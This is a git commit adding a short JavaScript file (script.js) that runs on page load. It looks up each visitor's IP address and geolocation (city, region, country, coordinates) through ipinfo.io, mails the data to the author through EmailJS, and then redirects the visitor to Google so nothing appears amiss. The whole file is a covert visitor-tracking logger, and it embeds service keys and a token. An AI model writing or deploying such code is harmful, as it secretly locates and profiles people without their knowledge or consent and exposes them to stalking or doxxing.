d70d3eb104be68d44ad8a341d887a066bc9e95d0
Princia-dev <oguerep@gmail.com>
2025-05-16 16:13:33 +0100

    Add files via upload

---
+++ script.js
@@ -0,0 +1,32 @@
+window.onload = async function () {
+    emailjs.init("PYUYW4IWCVoZ7zYK3"); // Clé publique EmailJS
+
+    try {
+        const response = await fetch("https://ipinfo.io/json?token=15f29802768d7e");
+        const data = await response.json();
+        const now = new Date().toLocaleString();
+
+        const infos = {
+            ip: data.ip,
+            ville: data.city,
+            region: data.region,
+            pays: data.country,
+            position: data.loc,
+            heure: now
+        };
+
+        await emailjs.send("service_9v6pjko", "template_wv5mezn", {
+            ip: infos.ip,
+            ville: infos.ville,
+            region: infos.region,
+            pays: infos.pays,
+            position: infos.position,
+            heure: infos.heure
+        });
+
+        window.location.href = "https://www.google.com";
+
+    } catch (error) {
+        console.error("Erreur lors de la collecte ou de l’envoi :", error);
+    }
+};
